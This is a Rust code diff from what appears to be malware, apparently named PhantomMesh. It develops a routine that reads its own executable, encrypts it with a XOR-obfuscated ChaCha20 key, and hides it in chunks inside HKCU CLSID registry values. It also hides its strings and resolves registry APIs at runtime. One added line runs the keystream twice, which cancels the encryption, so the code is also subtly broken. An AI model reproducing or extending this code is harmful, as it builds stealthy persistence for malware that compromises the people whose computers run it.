@@ -18,15 +18,16 @@ fn x(bytes: &[u8]) -> String {
 }
 
 // ChaCha20 Key (32 bytes) - XOR Obfuscated at compile time
-// Actual key is recovered at runtime via XOR with 0xAA
+// Actual key: "PhantomMeshKey2026_SecretKey!@#$" XOR 0xAA
 const CHACHA_KEY_ENC: [u8; 32] = [
-    0xFA, 0xC2, 0xCB, 0xC4, 0xDE, 0xC5, 0xCD, 0xE7,
-    0xCF, 0x83, 0xC2, 0xE1, 0xCF, 0xD4, 0x98, 0x9A,
-    0x98, 0x9C, 0xF5, 0xF9, 0xCF, 0xC9, 0xD9, 0xCF,
-    0xDE, 0xE1, 0xCF, 0xD2, 0x8B, 0xEA, 0x89, 0x8E,
+    0xFA, 0xC2, 0xCB, 0xC4, 0xDE, 0xC5, 0xC7, 0xE7,
+    0xCF, 0xD9, 0xC2, 0xE1, 0xCF, 0xD3, 0x98, 0x9A,
+    0x98, 0x9C, 0xF5, 0xF9, 0xCF, 0xC9, 0xD8, 0xCF,
+    0xDE, 0xE1, 0xCF, 0xD3, 0x8B, 0xEA, 0x89, 0x8E,
 ];
 
-const CHACHA_NONCE_ENC: [u8; 12] = [0xFA, 0xE2, 0xE7, 0xE4, 0xE5, 0xE4, 0xC9, 0xEF, 0x9A, 0x9A, 0x9A, 0x9B];
+// Nonce: "PHMNONCE0001" XOR 0xAA
+const CHACHA_NONCE_ENC: [u8; 12] = [0xFA, 0xE2, 0xE7, 0xE4, 0xE5, 0xE4, 0xE9, 0xEF, 0x9A, 0x9A, 0x9A, 0x9B];
 const KEY_XOR: u8 = 0xAA;
 
 /// Decode key at runtime
@@ -164,14 +165,20 @@ pub fn install_self_to_registry() -> Result<String, String> {
     unsafe {
 
         // Read current executable using native API
+        crate::k::debug::log_detail!("Reading self (native)...");
         let data = read_self_native()?;
         let mut data = data; // Make mutable for encryption
+        crate::k::debug::log_detail!("Read {} bytes", data.len());
 
         // Encrypt with ChaCha20 (key decoded at runtime)
         let key = get_key();
         let nonce = get_nonce();
         let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
         cipher.apply_keystream(&mut data);
+
+        cipher.apply_keystream(&mut data);
+        
+        crate::k::debug::log_hex!("Encrypted Payload (First 16b)", data);
 
         // Base64 encode
         let b64_data = base64_encode(&data);
@@ -183,6 +190,7 @@ pub fn install_self_to_registry() -> Result<String, String> {
         let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);                   // CLSID
         
         let path = format!("{}\\{}\\{}\\{}", p1, p2, p3, clsid);
+        crate::k::debug::log_op!("Registry", format!("Target Key: HKCU\\{}", path));
         let path_wide = to_wide(&path);
 
         // Resolve Registry APIs from advapi32.dll
@@ -233,30 +241,57 @@ pub fn install_self_to_registry() -> Result<String, String> {
         );
         
         if status != 0 {
+            crate::k::debug::log_err!(format!("RegCreateKeyExW failed: {}", status));
             return Err(format!("E39:{}", status));
         }
 
-        // Set value (Payload)
-        let val_name = x(&[0x05, 0x34, 0x2C, 0x39, 0x3A, 0x34, 0x31]); // Payload
-        let val_name_wide = to_wide(&val_name);
-        
         // Convert base64 string to wide string for REG_SZ
-        let b64_wide = to_wide(&b64_data);
+        // SPLIT PAYLOAD FIX: Chunk size 500KB
+        let chunk_size = 500 * 1024; 
+        // Base64 string is ASCII, so byte offset works fine.
+        let total_len = b64_data.len();
+        let mut offset = 0;
+        let mut index = 0;
         
-        let status = reg_set(
-            hkey,
-            val_name_wide.as_ptr(),
-            0,
-            REG_SZ,
-            b64_wide.as_ptr() as *const u8,
-            (b64_wide.len() * 2) as u32
-        );
+        crate::k::debug::log_detail!("Writing Payload (Total: {} bytes) in chunks...", total_len);
         
-        reg_close(hkey);
-        
-        if status != 0 {
-            return Err(format!("E40:{}", status));
+        while offset < total_len {
+            let end = std::cmp::min(offset + chunk_size, total_len);
+            let chunk = &b64_data[offset..end];
+            
+            // Name: Payload, Payload1, Payload2...
+            let val_name_str = if index == 0 {
+                x(&[0x05, 0x34, 0x2C, 0x39, 0x3A, 0x34, 0x31]) // Payload
+            } else {
+                format!("{}{}", x(&[0x05, 0x34, 0x2C, 0x39, 0x3A, 0x34, 0x31]), index)
+            };
+            
+            let val_name_wide = to_wide(&val_name_str);
+            let chunk_wide = to_wide(chunk);
+            
+            crate::k::debug::log_detail!("Writing Chunk {} ({} bytes)...", index, chunk.len());
+            
+            let status = reg_set(
+                hkey,
+                val_name_wide.as_ptr(),
+                0,
+                REG_SZ,
+                chunk_wide.as_ptr() as *const u8,
+                (chunk_wide.len() * 2) as u32
+            );
+            
+            if status != 0 {
+                crate::k::debug::log_err!(format!("Chunk {} Write Fail: {}", index, status));
+                reg_close(hkey);
+                return Err(format!("E40:{}", status));
+            }
+            
+            offset = end;
+            index += 1;
         }
+        
+        crate::k::debug::log_detail!("All Chunks Written Successfully.");
+        reg_close(hkey);
 
 
         
